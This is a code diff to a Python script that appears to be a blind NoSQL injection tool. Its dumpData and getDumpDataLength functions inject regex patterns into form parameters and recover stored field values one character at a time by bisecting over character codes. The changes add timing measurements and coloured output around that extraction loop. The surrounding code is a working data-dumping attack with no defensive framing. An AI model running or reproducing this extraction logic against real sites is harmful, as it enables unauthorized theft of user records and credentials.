@@ -153,7 +153,7 @@ def dumpData(nsi, username, form_data, row = 0, index = 1, length = 1, left = 1,
     # print('row:' + str(row))
     # print(found)
     # print("LEN : " + str(length))
-    
+    prev = ""
     if (len(found) != 0):
         # print(colored('EXTRACT NEXT ROW', "yellow", attrs=["blink"]))
         # print(username)
@@ -163,8 +163,10 @@ def dumpData(nsi, username, form_data, row = 0, index = 1, length = 1, left = 1,
         # get length
         lengthNextRow = getDumpDataLength(nsi, username, form_data, found)
         lens.append(lengthNextRow)
-        
+        total_time = 0
         for sindex in range(0, lengthNextRow+1):
+            # print('xxx', sindex, + len(range(0, lengthNextRow+1)))
+            start_time = time.time()
             # print(f'masuk bisect {sindex}' + str(sright - sleft > 4))
             
             regex_pattern = ""
@@ -223,6 +225,12 @@ def dumpData(nsi, username, form_data, row = 0, index = 1, length = 1, left = 1,
                 #     time.sleep(4)
                 #     break
                 if query(nsi, form_data):
+                    end_time = time.time()
+                    time_taken = end_time - start_time
+                    total_time += time_taken
+                    # total_time.append(time_taken)
+                    if (not nsi.isSilent):
+                        print(colored(f"Time taken for append {chr(i)}: {time_taken}", "yellow", attrs=["blink"]))
                     # print("query ans : " + str(command))
                     # print(f"[!] Answer: {i} ({chr(i)})")
                     # print(colored(f"[!] Answer: {i} ({chr(i)})", "green", attrs=["blink"]))
@@ -231,16 +239,22 @@ def dumpData(nsi, username, form_data, row = 0, index = 1, length = 1, left = 1,
                     sleft = 1
                     sright = 0x7f
                     break
+            # if (prev != total_time and total_time != 0):
+            #     print("Total Time:" + str(total_time))
+            # prev = total_time
         
         letters_found = username+''.join(res_chars)
         if (letters_found == username):
             return
         found.append(letters_found)
-        
+        mergeFound = str(found[len(found) - 1])
+        print(colored(f"Found: {mergeFound} Total Time: {total_time}", "green", attrs=["blink"]))
     else :
         # dump row 1
         ########### ini enumerasi rentang dri sebuah field untuk memperkecil pencarian ###########
+        total_time = 0
         for index in range(1, length+1):
+            start_time = time.time()
             # print(f'=== masuk bisect {index}: ' + str(right - left > 4) + "=======\n")
             # print(f'LEFT: {left} - RIGHT: {right}')
 
@@ -277,7 +291,14 @@ def dumpData(nsi, username, form_data, row = 0, index = 1, length = 1, left = 1,
                 Str.iterateParam(form_data, command)
                 
                 if query(nsi, form_data):
-                    print(colored(f"[!] Answer: {i} ({chr(i)})", "green", attrs=["blink"]))
+                    end_time = time.time()
+                    time_taken = end_time - start_time
+                    total_time += time_taken
+                    # total_time.append(time_taken)
+                    
+                    # print(colored(f"[!] Answer: {i} ({chr(i)})", "green", attrs=["blink"]))
+                    if (not nsi.isSilent):
+                        print(colored(f"Time taken for append {chr(i)}: {time_taken}", "yellow", attrs=["blink"]))
                     letters_found += chr(i)
                     res_chars.append(chr(i))
                     left = 1
@@ -286,10 +307,13 @@ def dumpData(nsi, username, form_data, row = 0, index = 1, length = 1, left = 1,
                     # print("NEW LEFT " + str(left))
                     # print("NEW RIGHT " + str(right))
                     # return i
+            # print("Total Time:" + str(total_time))
         found.append(letters_found)
+        mergeFound = "".join(found)
+        print(colored(f"Found: { mergeFound } - Total Time: {total_time}", "green", attrs=["blink"]))
         
-    print(found)
-    time.sleep(5)
+    # print(found)
+    # time.sleep(5)
     dumpData(nsi, username, form_data=form_data, row=row, index=1, length=1, left=1, right=0x7f, found=found)
 
 def getDumpDataLength(nsi, username, form_data, found = ""):
@@ -328,6 +352,7 @@ def getDumpDataLength(nsi, username, form_data, found = ""):
     # print("right:" + str(right))
     
     length = 0
+    time_taken = 0
     for i in range(left,right+1): # do match
 
         Str.iterateParam(form_data, r"^%s^%s.{%s}$" % (regex_pattern, username, i))
@@ -340,8 +365,8 @@ def getDumpDataLength(nsi, username, form_data, found = ""):
                 total_time_length += time_taken
                 
                 length = i
-                if (not nsi.isSilent):
-                    print(colored(f"Time taken for append {i}: {time_taken}", "yellow", attrs=["blink"]))
+                # if (not nsi.isSilent):
+                #     print(colored(f"Time taken for append {i}: {time_taken}", "yellow", attrs=["blink"]))
                 start_time_length = time.time()
                 total_time_length = 0
                 # break
